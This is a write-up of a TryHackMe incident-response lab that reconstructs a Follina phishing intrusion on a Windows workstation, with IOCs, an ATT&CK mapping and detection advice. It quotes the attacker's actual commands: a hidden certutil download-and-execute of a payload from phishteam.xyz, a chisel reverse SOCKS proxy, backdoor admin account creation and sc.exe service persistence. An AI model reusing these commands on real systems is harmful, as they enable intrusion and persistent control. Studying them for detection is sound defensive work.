# Full attack-chain DFIR — compromised workstation (TryHackMe: Tempest)

**Type:** lab exercise (TryHackMe, "Tempest" — SOC Level 1 **Capstone Challenge**)
**Role:** SOC L1 / incident responder
**Goal:** reconstruct a complete intrusion on a single workstation — from a phishing document to full SYSTEM control — using Sysmon, Windows Event Logs, and a full packet capture.

> Lab exercise, not a real incident. Written to practise a full-kill-chain investigation. Harvested credentials and CTF-style values are redacted.

**Host:** `benimaru-TEMPEST` · **User:** `TEMPEST\benimaru`
**Data sources:** Sysmon (EVTX), Windows Security log, packet capture.
**Tooling:** EvtxECmd + Timeline Explorer, Event Viewer, Wireshark / tshark, CyberChef, VirusTotal.

---

## 1. Initial access — Follina (CVE-2022-30190)

A weaponized Word document was opened in `WINWORD.EXE` (PID **496**). Instead of a macro, the document abused the **MSDT** protocol: Sysmon shows `WINWORD.EXE` leading to `C:\Windows\SysWOW64\msdt.exe`, which dropped `TS_ProgramCompatibilityWizard.ps1` into a `%Temp%\SDIAG_*` folder — the signature of **Follina (CVE-2022-30190)**.

- The document fetched its remote payload from `http://phishteam.xyz/02dcf07/index.html` (the embedded exploit URL).
- The malicious domain resolved to **167.71.199.191** (Sysmon Event ID 22 / 3).
- The payload executed a base64-encoded PowerShell command (Sysmon Event ID 1, child of the exploit chain).

## 2. Execution & persistence — stage 2

An autostart entry executes on login (Sysmon Event ID 1, **ParentImage = `explorer.exe`**):

```
powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
```

- **Persistence:** a file in the user's Startup folder (`...\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`) re-runs this on every login.
- **LOLBin download:** `certutil -urlcache` pulls `first.exe` and runs it.

## 3. C2 #1 — `first.exe`

`first.exe` beacons to **167.71.222.162:80** over HTTP:

| Property | Value |
|---|---|
| Method | GET |
| Command channel | `GET /9ab62b5` (tasking) |
| Result channel | `GET /9ab62b5?q=<base64>` |
| Encoding | base64 |
| Compiler (User-Agent) | **Nim** |

Decoding every `?q=` value (tshark → `From Base64`) reconstructs the operator's command history verbatim.

> Fast decode of the whole C2 channel:
> ```powershell
> $pcap = (Get-ChildItem "...\capture.*").FullName
> & "C:\Program Files\Wireshark\tshark.exe" -r $pcap -Y http.request -T fields -e http.request.uri |
>   ForEach-Object { if ($_ -match 'q=(\S+)') { try { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($matches[1])) } catch {} } }
> ```

## 4. Discovery

From the decoded C2 results:

- `type C:\Users\Benimaru\Desktop\automation.ps1` → a plaintext credential pair (`$user` / `$pass`, **redacted**).
- `netstat -ano -p tcp` → **WinRM** listening on **5985** (a remote-shell avenue).
- `whoami /priv` → **SeImpersonatePrivilege** enabled.

## 5. Lateral movement — reverse SOCKS proxy

The attacker downloaded `ch.exe` (**chisel**) from `phishteam.xyz` and started a reverse SOCKS proxy (`ch.exe client <IP>:<port> R:socks`), then authenticated with the harvested credentials over **WinRM**.

## 6. Privilege escalation — PrintSpoofer

With `SeImpersonatePrivilege` available, the attacker fetched `sop.exe`:

- SHA256 `8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d` → VirusTotal identifies it as **PrintSpoofer**.
- PrintSpoofer abuses **SeImpersonatePrivilege** to run a payload as `NT AUTHORITY\SYSTEM` — here, **`final.exe`**, which opened a second C2 channel on a different port.

## 7. Actions on objective

Running as SYSTEM, the attacker:

- Created two accounts — **`shion`** and **`shuna`** (`net user ... /add`). An earlier attempt failed because it omitted the **`/add`** option. → Security **Event ID 4720** (A user account was created).
- Added an account to the local admins: `net localgroup administrators /add shion`. → Security **Event ID 4732** (member added to a security-enabled local group).
- Installed service persistence: `C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto` (runs as LocalSystem).

## 8. IOCs

| Type | Indicator |
|---|---|
| Domain | `phishteam.xyz` (hosted `index.html`, `first.exe`, `ch.exe`) |
| IP | `167.71.199.191` (Follina payload), `167.71.222.162:80` (C2 #1) |
| File | `first.exe` (Nim stager), `ch.exe` (chisel), `sop.exe` (PrintSpoofer), `final.exe` (SYSTEM C2) |
| SHA256 | `8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d` (PrintSpoofer) |
| Accounts | `shion`, `shuna` |
| Service | `TempestUpdate2` → `C:\ProgramData\final.exe` |

## 9. ATT&CK mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1566.001 Spearphishing Attachment |
| Execution | T1203 Exploitation for Client Execution (CVE-2022-30190); T1059.001 PowerShell |
| Persistence | T1547.001 Startup folder; T1543.003 Windows Service |
| Privilege Escalation | T1134.001 Token Impersonation (SeImpersonate → PrintSpoofer) |
| Defense Evasion | T1218 (MSDT), T1036 Masquerading |
| Credential Access | T1552.001 Credentials in Files (`automation.ps1`) |
| Discovery | T1057 / T1049 (netstat), T1033 (`whoami`) |
| Lateral Movement | T1090 Proxy (chisel); T1021.006 WinRM |
| Command & Control | T1071.001 Web; T1132.001 Standard Encoding (base64); T1571 Non-Standard Port |
| Impact / Objective | T1136.001 Create Account; T1098 Account Manipulation |

## 10. Detection & response

**High-value detections**
- Office app spawning `msdt.exe` (Follina) or any child under `WINWORD.EXE` that is `powershell`/`cmd`.
- `certutil -urlcache` and `powershell -w hidden` — downloader + hidden-window combo.
- A process under `explorer.exe` from the Startup folder reaching out to the internet.
- `sc.exe create ... binpath=` pointing at `C:\ProgramData\*.exe`.
- Security **4720** + **4732** in quick succession (account created, then added to Administrators).

**Response**
- Isolate the host; disable/remove `shion`, `shuna` and the `TempestUpdate2` service.
- Remove Startup-folder persistence and the dropped binaries; block `phishteam.xyz` and the C2 IPs.
- Rotate the credentials exposed in `automation.ps1`; hunt other hosts for the same IOCs.
- Patch MSDT/Follina; restrict `SeImpersonatePrivilege` and service-creation rights.

---

## Techniques & tools

`Sysmon / EVTX` · `EvtxECmd + Timeline Explorer` · `Event Viewer` · `Wireshark / tshark` · `CyberChef (Base64)` · `VirusTotal` · full-kill-chain timeline · MITRE ATT&CK mapping
